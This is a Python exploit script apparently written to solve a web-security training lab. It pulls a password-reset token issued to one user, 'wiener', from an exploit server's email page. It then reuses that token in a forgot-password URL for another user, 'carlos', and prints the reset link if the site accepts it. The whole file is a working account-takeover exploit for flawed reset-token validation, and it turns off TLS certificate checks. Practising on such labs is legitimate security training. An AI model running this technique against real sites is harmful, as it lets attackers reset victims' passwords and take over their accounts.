#!/usr/bin/env python3
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EMAIL_URL = "https://exploit-0a1c0003031e9fa5807316b801f600a8.exploit-server.net/email"
TARGET_HOST = "0afd00da03d69f0f803617a200220017.web-security-academy.net"

# Fetch latest token from email
response = requests.get(EMAIL_URL, verify=False)
tokens = re.findall(r'token=([a-f0-9]{40})', response.text)

if tokens:
    latest_token = tokens[0]
    print(f"[+] Latest wiener token: {latest_token}")

    # Test with carlos
    carlos_url = f"https://{TARGET_HOST}/forgot-password?user=carlos&token={latest_token}"
    print(f"\n[*] Testing token for carlos...")
    print(f"[*] URL: {carlos_url}")

    test_response = requests.get(carlos_url, verify=False)

    if "Set a new password" in test_response.text or "new-password" in test_response.text:
        print(f"\nðŸŽ¯ðŸŽ¯ðŸŽ¯ SUCCESS! Token works for carlos!")
        print(f"\nUse this URL to reset carlos's password:")
        print(carlos_url)
    else:
        print(f"\n[-] Token doesn't work for carlos")
        print(f"[-] Response length: {len(test_response.text)}")
        if "Invalid" in test_response.text or "incorrect" in test_response.text:
            print("[-] Token is invalid or expired")
else:
    print("[-] No tokens found in email")
